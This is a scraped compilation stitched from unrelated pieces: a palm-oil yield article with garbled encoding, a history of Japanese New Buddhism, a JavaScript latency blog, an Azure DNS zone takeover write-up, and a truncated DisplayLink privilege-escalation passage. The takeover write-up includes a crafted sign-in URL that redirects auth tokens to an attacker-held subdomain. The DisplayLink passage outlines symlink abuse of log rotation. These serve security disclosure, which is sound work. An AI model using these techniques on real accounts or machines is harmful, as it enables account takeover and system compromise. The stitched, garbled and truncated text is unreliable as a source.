<p>Tropical forests and peatlands are great storehouses of carbon dioxide, the main gas indicted in global warming. Malaysiaâ€™s forests are especially rich in carbon. They can hold up to 220 pounds of carbon per square mile. â€œThat's equivalent to the emissions from driving an average car from New York to San Francisco and back&nbsp;76 times,â€� the Union for Concerned Scientists tells us. Razing forests and peatlands unleashes carbon dioxide into the atmosphere in calamitous amounts. Deforestation for palm cultivation in Indonesia accounted for 2 to 9 percent of all tropical land use emissions from 2000 to 2010. Palm oil expansion is also robbing orangutans, tigers, rhinos, and elephants of their natural habitats. Global demand for palm oil is expected to increase from 76 million tons in 2019 to over 400 million tons in 2050.</p>

<p>Environmentalists are realists enough to know that&nbsp;palm oil is here to stay. Too much money and too many powerful government and community interests are tied up in its production. You donâ€™t overturn the world economy overnight. Plenty of nonprofits are pushing sustainable harvesting of palm oil and an international movement, Roundtable on Sustainable Palm Oil, is signing up companies to pledge to employ smart environmental practices. These grassroots efforts, though important, may amount to little more than a superficial solution, however.</p>
<p>Whatâ€™s most needed is way to reboot our relationship with the oil palm—to find a way to produce more oil on less land. Here is where plant scientists must step in. And they have. They have crafted a novel genetic technique to induce each palm oil tree to produce more fruit, containing more of the precious oil. Itâ€™s a way to keep the ice-cream makers happy while saving the rainforest, and it can be scaled up now.</p>
<p><span>R</span>ob Martienssen, a plant biologist at <a href="https://www.cshl.edu/" target="_blank">Cold Spring Harbor Lab</a>, has been one&nbsp;of the worldâ€™s key researchers into the puzzles of palm oil production: why scientific methods have gone wrong in the past, and how to right those wrongs today. Launching a project to grow more palm oil on less land was the easy part, he knew. Scientists locked in on that goal some decades ago and set out to clone a single â€œeliteâ€� palm, one that produced a bounty of oil, into 50,000 palms just like it. They even succeeded, up to a point. â€œThey thought this was going to solve all problems,â€� Martienssen says, but cloning the elite palm in the lab turned out to offend the plantâ€™s natural growth processes. Once planted, the identical trees were â€œmantledâ€�: Instead of yielding the promised bounty, the plants produced gnarled fruit that gave no oil.&nbsp;</p>
<p>It took an international collaboration between <a href="https://www.cshl.edu/research/faculty-staff/rob-martienssen/#news" target="_blank">Martienssenâ€™s group</a> at Cold Spring Harbor Lab and their colleagues at the Malaysian Palm Oil Board nearly 20 years to unravel the mystery of the mantled fruit. They started by assembling and analyzing the whole genome sequence of the <em>Elaeis guineensis </em>oil palm. That enormous effort only made the problem more puzzling, however, because they found no genetic differences between normal and mantled clones.</p>
<p>Rather than give up, the researchers dove even deeper, beyond the DNA of the oil palm and into the layer of biology that regulates how DNA is read and translated: the epigenome. To their astonishment, <a href="https://www.cshl.edu/what-s-behind-million-dollar-crop-failures-in-oil-palm-would-you-believe-bad-karma/" target="_blank">they found</a> that the huge difference in the mantled clones was the result of a single, tiny epigenetic change. Palms that produce mangled fruit have an altered molecular switch that interferes with expression levels of genes relevant to healthy fruit production. Previously that miscreant switch had been identified in rice plants and was named â€œkarma.â€� The palm clones literally suffered from <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4857894/" target="_blank">bad karma</a>.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/cshl_e0b979cd9ee928ce965e9001019fee92.png" alt="palm_oil_sec_2_final_resized850_500"><figcaption><span>Getting rid of palm oil would come with its own drawbacks, so researchers are focusing on making it more benign. </span><br><span>Credit:  International Union for Conservation of Nature (IUCN)</span></figcaption></figure>
<p>â€œIn terms of individual palms, if you have bad karma, then it's going to literally get no oil,â€� Martienssen says. With the mechanism behind mantling unmasked, a third partner—Orion Genomics, a private startup founded by Martienssen—was able to develop a simple <a href="https://www.youtube.com/watch?v=b9Dj-MKgBkc" target="_blank">DNA test</a> that predicts whether a designer seedling will bear robust or withered fruit. Then only the genuine, high-yield clones will make their way into the field.</p>
<p>That epigenetic test could be making a difference in the oil-palm plantations very soon. â€œIt's currently being commercialized jointly by the Malaysian Palm Oil Board and Orion Genomics,â€� Martienssen says. He projects that reliable clonal stocks could increase yields by 30 to 50 percent, drastically reducing the pressure for illegal forest clearing. And thatâ€™s just the start. Other scientists are working on dwarf varieties of the oil palm that are easier to harvest, that come to maturity faster, and that stay in production for longer. The epigenetic test can be applied to <a href="https://www.cshl.edu/nobelist-sir-richard-roberts-talks-gmos-at-cshl/" target="_blank">genetically modified</a> palm varieties for a synergistic effect, but—important for many consumers and environmentalists—it provides major benefits on the non-GMO clones as well.</p>
<p>In Malaysia, the government is finally acting to protect whatâ€™s left of Sarawakâ€™s ancient forest canopy. New policies limit the expansion of palm plantations to 6.5 million hectares, which leaves just 1 million more hectares of land for cultivation. These moves create strong incentives to enact a better, smarter relationship between humans and the plants they rely on. â€œFrom a world production point of view, palm oil is not going away,â€� Martienssen says. â€œReducing its footprint is the best thing we can do to help the rainforest.â€�

		<p>It would be an exaggeration to say that “Zen” was invented as a defense against American gunboats. It would not be <em>completely</em> wrong, however.</p>
<p>This is a post in my <a href="https://vividness.live/2011/06/07/the-crumbling-buddhist-consensus-summary/">Crumbling Buddhist Consensus series</a>. Modernized Zen is one of the two main Buddhist sources for Consensus Western Buddhism. This post explains how and why Japan radically altered Zen to make it compatible with Western ideas.</p>
<h2>Opening the Japanese oyster</h2>
<p>On July 8, 1853, Commodore Matthew C. Perry took four state-of-the-art American warships into Tokyo harbor. They were powered by steam engines and armed with a devastating new weapon. Their Paixhans guns fired explosive shells: not solid metal cannon balls, but bombs that detonated on hitting their target. Perry gave a “shock and awe” demonstration, destroying several buildings on the harbor front.</p>
<p>Against this barbaric assault, Japan had no defense whatsoever.</p>
<p>For two centuries, it had maintained a policy of cultural isolation. Christian missionaries had arrived in the 1600s, and successfully converted many Japanese. When the Empress learned how Europe took the Americas, she correctly concluded that the missionaries were the first step in a strategy of colonization.</p>
<p>Japan banned Christianity. All Japanese were required to belong to, and financially support, a Buddhist temple, to prove they weren’t Christians.</p>
<p>To eliminate dangerous foreign ideas, nearly all contact with the outside world was prevented by force. This isolation successfully kept out Christianity. Unfortunately, it also kept out Western technology. In 1853, Japan had almost no guns, and those few were hopelessly obsolete. Perry could have leveled Tokyo, and there would have been nothing Japan could have done about it.</p>
<p>His four black ships defeated a glorious empire. Japan was forced to sign a series of humiliating treaties, on terms dictated by America. These ended Japan’s policy of isolation; Perry had “opened the Japanese oyster,” as American headlines put it. (Yum!) The unequal treaties gave Americans free trade access, the right to live in Japan, and the right for missionaries to teach Christianity. Other Western powers imposed similar treaties over the next few years.</p>
<p>These treaties were seen by both the West and Japan as first steps toward colonial domination.</p>
<h2>Japan chooses modernism</h2>
<p>The situation was critical; dire; intolerable. But what to do?</p>
<p>Step 1, obviously, was to get some Western-style warships. Just a year after Perry’s arrival, Japan had built its first: an astonishing feat, given a start from late-Medieval-level technology. Over the next few decades, Japan continually built and bought ever-more-powerful gunboats.</p>
<p>Unfortunately, it was always behind. Among the Western powers, warships were the main technology arms race during the second half of the 1800s. Japan fought a series of naval battles against Western powers in the 1850s and 1860s, and it was crushed every time.</p>
<p>The problem was that warships weren’t just an accidental discovery. They depended on Western technology, which depended on Western science, which depended on Western philosophy.</p>
<p>During the 1850s and 1860s, Japan’s elite was profoundly split over strategy:</p>
<ul>
<li>Modernists argued that the only way to compete with the West was to adopt Western ideologies. Japan must transform itself into a Western power.</li>
<li>Conservatives argued that Japan’s cultural heritage, its values, were what made it great. To adopt Western ideologies would be to do the foreign devils’ work for them; to destroy everything that made Japan Japan.</li>
</ul>
<p>In the late 1860s, this split broke into civil war. The modernists won, and took control of the country.</p>
<p>Japan modernized astonishingly quickly. Feudalism was replaced with a modern bureaucratic state. The traditional economy was replaced with capitalism. Late-Medieval technology was replaced with modern industry. The military, closely entwined with the government, was built up rapidly, and soon won wars against China, Russia, and Korea.</p>
<p>Japan adopted the European ideology of the nation-state, which required a single culture throughout its territory. Among other things, that meant the selection of a state religion. Up to this point, Japan had a confused mixture of Buddhism, Shinto, and Confucianism, without a “true national religion in the manner of Western nations”. This was declared “a weakness in the Japanese national identity, placing it at a disadvantage to the Western powers.”</p>
<h2>Abolish Buddhism and destroy Shakyamuni!</h2>
<p>The modernists’ concession to traditionalism was the slogan “Japanese ethics, Western technology.” Japan’s essential national character, its inviolable fundamental values, would remain intact. Especially, Japan would <em>not</em> adopt Christianity.</p>
<p>The new state adopted Shinto as its official religion. Shinto would be the sacred carrier of Japaneseness. Buddhism, instead, was pretty much banned.</p>
<p>Up til then, the Buddhist institutional Sangha had immense social and economic power, due to the old requirement that all Japanese belong to and support a temple. These religious taxes were heavy, and widely resented. The Sangha had backed the losing, traditionalist side during the ’50s and ’60s. Eliminating Buddhism was popular with many ordinary people, and wiped out a hostile power base.</p>
<p>The anti-Buddhist movement was called <em>haibutsu kishaku</em>, which means “abolish Buddhism and destroy Shakyamuni.” Buddhism was declared to be “a corrupt, decadent, anti-social, parasitic and superstitious creed, inimical to Japan’s need for scientific and technological advancement.” It was denounced as not really Japanese, but a foreign import. It was from China, a seemingly great empire that proved pathetically weak as the colonial powers carved it up in the 1840s and ’50s.</p>
<p>Most Buddhist temples were closed. Many were destroyed. Buddhist monks were forced to return to lay life or forcibly converted to Shinto. Countless Buddhist books and treasures were confiscated or burned.</p>
<h2 id="newbuddhism">The New Buddhism</h2>
<p>Buddhism was saved, sort of, by a small group of Buddhists who had sided with the modernists during the 1850s and ’60s. They were intellectuals, educated at newly created Western-style universities, who saw value in both Buddhism and Western ideas.</p>
<p>They agreed that the Buddhist establishment had to be destroyed. Institutional Buddhism had “degenerated” into meaningless rituals and folk superstitions. But this was the fault of a corrupt Sangha, not Buddhism itself. <em>Haibutsu kishaku</em> was a purifying flame that would actually strengthen Buddhism in the long run.</p>
<p>They proposed that a “<a href="http://en.wikipedia.org/wiki/Buddhist_modernism#.22New_Buddhism.22_and_Japanese_Nationalism">New Buddhism</a>” (<em>shin bukkyo</em>) could be a powerful tool for the government in its drive to modernize and strengthen Japan. Their sales pitch succeeded; persecution of Buddhism ended. <a href="http://en.wikipedia.org/wiki/Imakita_Kosen">Imakita Kosen</a>, one of the leaders of the New Buddhism movement, was made a Doctrinal Instructor at the Ministry of Doctrine, with power to reform the religion:</p>
<ul>
<li>New Buddhism was supposedly scientific, empirical, and rational. It showed that Buddhism “actually anticipated modern scientific discoveries in areas as diverse as physics, astronomy, and psychology.” It taught the importance of the technological worldview to everyone.</li>
<li>Old Buddhism was infested with gods, spirits, monsters, and demons. New Buddhism rejected the supernatural.</li>
<li>New Buddhism also rejected the literal understanding of karma and rebirth. Those were superstitions.</li>
<li>The main job of Buddhist priests had been to perform rituals (especially funerals). New Buddhism devalued that.</li>
<li>The Sangha had been parasitic and self-interested. New Buddhism was socially responsible and socially engaged.</li>
<li>The Sangha had spent much of its energy on petty internal squabbles between Buddhist sects. New Buddhism was non-sectarian. It was a single, uniform religion for all people.</li>
<li>The Sangha had been remote from the people, concerned with pointless esoterica and imaginary after-death worlds. New Buddhism served ordinary people.</li>
<li>New Buddhism blurred the strict division between monks and lay people. It gave ordinary people access to practices—especially meditation—that had been reserved for the clergy.</li>
<li>New Buddhism was not a foreign import. Purged of alien influences, it was the highest expression of the Japanese national character.</li>
<li>As the holder of the sacred Japanese values—supposedly eternal but largely newly invented by the government—it was a way to impose state ideology on the masses.</li>
<li>New Buddhism was fiercely loyal to the state.</li>
<li>The limp girly-man pacifism of the old Buddhism was rejected. New Buddhism taught the sacred duty of Japan to go to war in order to bring correct ethics to the world.</li>
<li>Just as the Western powers exported Christianity to influence (and eventually subjugate) inferior peoples, Japan could export New Buddhism.</li>
<li>New Buddhism was, in fact, a universal “<a href="https://vividness.live/2011/06/28/a-new-world-religion/">world religion</a>.”</li>
<li>New Buddhism proposed, further, that Zen was the true, essential core of all religions—especially Christianity. Christianity was merely a confused approximation to Zen. If this idea could be made to stick, Japan could co-opt Christianity and turn Europeans’ missionary strategy against them.</li>
</ul>
<p>If you’ve read my earlier post about <a href="https://vividness.live/2011/06/24/protestant-buddhism/">Protestant reforms to Buddhism</a>, you’ll recognize many of the items on this list. All across Asia, the re-making of Buddhism in the late 1800s included both Protestant and nationalist factors. Japan took the nationalism more seriously than most.</p>
<p>The New Buddhist reform had limited effect in Japan. There’s still a lot of pretty traditional Buddhism there now. However, the strategy of exporting New Buddhism to the West was successful. The Zen we have now is heavily influenced by it. That Zen was one of the main inputs to “Consensus Buddhism.”</p>
<p>(Of course, export Buddhism was not <em>only</em> motivated by cynical nationalism. No doubt all those involved also genuinely believed that they were bringing a better religion to Westerners, for our benefit.)</p>
<h2>Exporting New Buddhism</h2>
<p>Imakita Kosen’s dharma heir, and successor at the Ministry of Doctrine, was <a href="http://en.wikipedia.org/wiki/Soyen_Shaku">Soyen Shaku</a>. In 1892, he wrote:</p>

<img src="https://yenkel.dev/media/2020-06-27/latency.png"></p><p>Even if the times are not exact and up to date for 2020, the gist of it is clear. Some operations (disk, network) are more expensive than others. When looking to minimize latency, start from operations that are more likely to take longer, because they are naturally slower due to hardware and speed of light limitations.</p><p>The importance of latency will depend on the software you are writing. For some software latency can business critical:</p><ul><li><a href="https://en.wikipedia.org/wiki/Real-time_computing" target="_blank" rel="nofollow noopener noreferrer">Real-time computing</a> where operations must guarantee completion under a deadline.</li><li>A SaaS with latency SLAs that you need to meet for your enterprise customers </li><li>e-commerce that loses money when the site is slow (see this great blog post about <a href="http://blog.tacertain.com/p-four-nines/" target="_blank" rel="nofollow noopener noreferrer">Amazon</a>).</li></ul><p>You might also be writing software that you want to be “fast enough” or “not unnecessarily slow”.</p><p>While getting to concrete latency guarantees for critical cases requires a lot of work and investment, it is also true that latency is one of those things that is easy to overlook unless you are paying attention. Over time, small decisions can pile up and you can end up with a product that is a lot slower than it should be mostly because of <a href="http://faculty.salisbury.edu/~xswang/Research/Papers/SERelated/no-silver-bullet.pdf" target="_blank" rel="nofollow noopener noreferrer">accidental complexity, not essential complexity</a>. </p><p>The “broken windows” theory presents the problem in a nice way (From <a href="https://en.wikipedia.org/wiki/Broken_windows_theory" target="_blank" rel="nofollow noopener noreferrer">wikipedia</a>): <em>The broken windows theory is a criminological theory that states that visible signs of crime, anti-social behavior, and civil disorder create an urban environment that encourages further crime and disorder, including serious crimes. The theory suggests that policing methods that target minor crimes such as vandalism, loitering, public drinking, jaywalking and fare evasion help to create an atmosphere of order and lawfulness, thereby preventing more serious crimes.</em>
<img src="https://yenkel.dev/media/2020-06-27/broken-windows.jpg"></p><p>Whether the theory is correct or not (there is an interesting chapter on this in the book <a href="https://www.amazon.com/Freakonomics-Economist-Explores-Hidden-Everything/dp/0060731338" target="_blank" rel="nofollow noopener noreferrer">Freakonomics</a>) it is a useful context to talk about software. In the software industry, the Pragmatic Programmer book states <a href="https://www.artima.com/intv/fixit.html" target="_blank" rel="nofollow noopener noreferrer">“don’t live with broken windows”</a>.
If we apply this to latency it is easy to reason that if you let small decisions/changes increase latency, over time the latency of the system will continuously increase over time. At some point, going back and figuring things out will be overly complex and sometimes teams decide to go for complicated solutions to solve this problem. We want to avoid that.</p><p>One of the things we do at <a href="http://auth0.com/" target="_blank" rel="nofollow noopener noreferrer">Auth0</a> is iterative delivery. Initial versions of code work and are tested, etc., but until we validate features with customers we avoid investing in optimizations. </p><p>However, some things can be done in an initial implementation so we don’t need to optimize later, as that’s when as a developer you have the context about what you are doing. Re-thinking many small decisions a few weeks down the road is less than ideal. In this context, thinking about “expensive operations” latency wise is useful.</p><p>As part of a project, we are working on developing a new service (<code>new-service</code>) and adding some calls to it from an existing service (<code>client</code>). As we reviewed the changes we made to the <code>client</code> with the team, we found several opportunities for improvement.</p><p>The code snippets below are examples written using Javascript, but these ideas are language agnostic.</p><h2 id="parallel-io"><a href="#parallel-io" aria-label="parallel io permalink"></a>Parallel I/O</h2><blockquote><p>When I/O ops do not depend on each other and you need all data if possible use parallel queries.</p></blockquote><p>Let’s say a change to client code looked like this:</p><div data-language="js"><pre><code>     <span>const</span> a <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    </code></pre></div><p>The <code>getDataFromNewService(...)</code> call performs network I/O. Because we are working on this <code>new-service</code>, we know it also does more network I/O to talk to a database (which might need to do some disk I/O). All of these operations are naturally in the slow end of the spectrum from the <a href="#latency-table">table at the beginning of this blog post</a>.</p><p>If we can’t avoid the operations, performing these in parallel yields some clear benefits. If the resulting code looks like this:</p><div data-language="js"><pre><code><span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>,</span> 
    <span>callNewService</span><span>(</span><span>...</span><span>)</span>
<span>]</span><span>)</span><span>;</span></code></pre></div><p>If we call the time for these operations <code>t1</code> (<code>existing-service</code>) and <code>t2</code> (<code>new-service</code>), in the last example we change the latency from <code>sum(t1, t2)</code> to <code>max(t1, t2)</code>. That even means that if we don’t want to make latency higher than the original, all we need to do is ensure <code>t2 &lt;= t1</code>!</p><h2 id="pre-fetching"><a href="#pre-fetching" aria-label="pre fetching permalink"></a>Pre-fetching</h2><blockquote><p>When I/O operations op2 only runs if op1 is likely to be successful, if op1 is likely to be successful in most cases, consider doing op2 in parallel (<a href="https://en.wikipedia.org/wiki/Prefetching" target="_blank" rel="nofollow noopener noreferrer">pre-fetching</a>).</p></blockquote><p>This case is similar to the previous one, but might be easier to miss. Let’s say the code after the change looks like this:</p><div data-language="js"><pre><code>    <span>const</span> param <span>=</span> <span>...</span>
    <span>const</span> exists <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span>param<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
        
    <span>}</span>
<span>+</span>   <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span>param<span>)</span><span>;</span>
<span>+</span>   </code></pre></div><p>Both function calls depend on <code>param</code>, which is available before calling <code>callExistingService(param)</code>. If the likelihood of <code>exists</code> being false is low, then calling <code>callNewService(param)</code> in parallel is likely worth it. You won’t be adding a lot more load to <code>new-service</code> in case <code>exists === false</code>, but you will be getting the aforementioned benefits for parallel I/O.</p><p>The latency improved code would look like this:</p><div data-language="js"><pre><code><span>const</span> param <span>=</span> <span>...</span>
<span>const</span> <span>[</span>exists<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
  <span>callExistingService</span><span>(</span>param<span>)</span><span>,</span>

A simple way of doing this is caching. However, it is important to consider that caching does not need to be overly complicated and require every developer’s favorite hammer <a href="https://redis.io/" target="_blank" rel="nofollow noopener noreferrer">Redis</a>. It just means <em>to store the value of computation to prevent performing the computation again</em>. </p><p>The code we reviewed was doing this:</p><div data-language="js"><pre><code>

<span>+</span>   <span>const</span> result <span>=</span> <span>callNewService</span><span>(</span>context<span>.</span>param<span>)</span><span>;</span></code></pre></div><p>In this situation, the <code>client</code> had a way to store the result of a previous call to <code>new-service</code> that returned the same value. If <code>result</code> is relatively small and does not change it can be stored with the context and loaded as part of <code>hydrateContext()</code>. That way, the call we can simply avoid <code>callNewService(context.param);</code>.</p><p>The fastest call is the call that never happens 😆</p><p>When you are working on code, don’t <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">optimize prematurely</a>. I recommend, however, you add a “mental checklist” item to focus on latency and cross it off before submitting a PR. That will help you find <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">Donald Knuth’s 3%</a>.</p><p>It is likely that just doing that and focusing on that latency for 10 minutes might point to small but valuable improvements that you can make, and accumulating latency over time.</p><p>Don’t live with latency broken windows!</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>

C:\Program Files\DisplayLink Core Software\Debug       Everybody         {WriteOwner, Delete, WriteAttributes, Synchronize...}
</pre></div>
<p>So, <code>Everybody</code> seems to have quite a lot of permissions on the
<code>C:\Program Files\DisplayLink Core Software\Debug</code> folder.</p>
<p>What even is this program? Let's check in <code>services.msc</code> to gain more
information:</p>
<p><img alt="DisplayLink information in services.msc" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_services_msc.png"></p><p>This service is part of a graphic software, automatically run, and runs as
<code>SYSTEM</code>.</p>
<p>If this <a href="https://www.displaylink.com/">DisplayLink</a> software performs
privileged operations using files from this <code>Debug</code> folder, it might be a
path to local privilege escalation! <em>(spoiler: it is)</em></p>
<p>This bug was discovered and exploited with a lot of help from my dear friend
and colleague (and James Forshaw's number one fan), <a href="https://twitter.com/clavoillotte">Clément Lavoillotte</a>.
His <a href="https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html">introduction to privileged file operation abuse on Windows</a>
proved to be an invaluable resource.</p>
</div><div id="onwards-with-exploit-searching">
<h2>Onwards with exploit searching!</h2>
<p>I then decided to load up a Windows 10 1909 virtual machine (closely enough
to the audited laptop for our purpose), and install the same version of
DisplayLink.</p>
<p>Turns out that the audited Windows laptop was using version 7.9.296.0 of
DisplayLink. This is an old version that is not listed in the <a href="https://www.displaylink.com/downloads">download
section</a>.</p>
<p>By poking around the <a href="https://archive.org/">Internet Archive</a>, it's possible
to find the <a href="https://www.displaylink.com/downloads/file?id=559">download link for this old version</a>.</p>
<div id="overpermissive-access-rights">
<h3>Overpermissive access rights</h3>
<p>With the software installed, let's take a look at the permissions on the
<code>Debug</code> folder:</p>
<p><img alt="Everyone has Full Control over the Debug folder" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/debug_folder_everyone_full_control.png"></p><p>Interestingly, the object <code>Everybody</code> has <code>Full Control</code> over
this folder.</p>
<p>If this folder contains sensitive files, such as DLL files, we can maybe modify
one, so that malicious code can be run as <code>SYSTEM</code>. Let's take a look at
the content of the folder:</p>
<p><img alt="The Debug folder contains log files" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/debug_folder_content.png"></p><p>Hmmm, only log files. So, no direct way to elevate our privileges. However,
the presence of <code>.log</code> and <code>.old.log</code> files indicates that there
might be log rotation in place. As Clément explained in his article, we can
exploit log rotation to perform arbitrary file creation.</p>
</div>
<div id="the-log-rotation">
<h3>The log rotation</h3>
<p>Let's observe a log rotation in <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a>:</p>
<p><img alt="Log rotation observed in Procmon" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_log_rotation.png"></p><p>At launch, <code>DisplayLinkManager.exe</code> seems to:</p>
<ol>
<li><p>Open the <code>DisplayLinkManager.log</code> log file</p>
</li>
<li><p>Perform some checks on it (content? size?)</p>
</li>
<li><p>If the checks warrant it, perform a log rotation:</p>
<p>3.1. Delete the <code>DisplayLinkManager.old.log</code> file, if it exists</p>
<p>3.2. Rename <code>DisplayLinkManager.log</code> to <code>DisplayLinkManager.old.log</code></p>
<p>3.3. Create a new <code>DisplayLinkManager.log</code></p>
</li>
</ol>
<p>As we can see, the actions are performed as the <code>SYSTEM</code> user. By looking
at the details of the events, no impersonation seems to be done.</p>
<p>As the DisplayLink Manager does not impersonate the user when accessing these
files, we might be able to write or delete arbitrary files.</p>
</div>
<div id="arbitrary-file-creation">
<h3>Arbitrary file creation</h3>
<p>Let's try to trick DisplayLink Manager into moving a file we control into a
privileged place. We can use the <code>CreateSymlink.exe</code> tool from Google Project Zero's
<a href="https://github.com/googleprojectzero/symboliclink-testing-tools">SymbolicLink Testing Tools</a>
to do so.</p>
<p>The symlinks can be created as follow:</p>
<ul>
<li>From <code>C:\Program Files\DisplayLink Core Software\Debug\DisplayLinkManager.log</code> to the file we want to move</li>
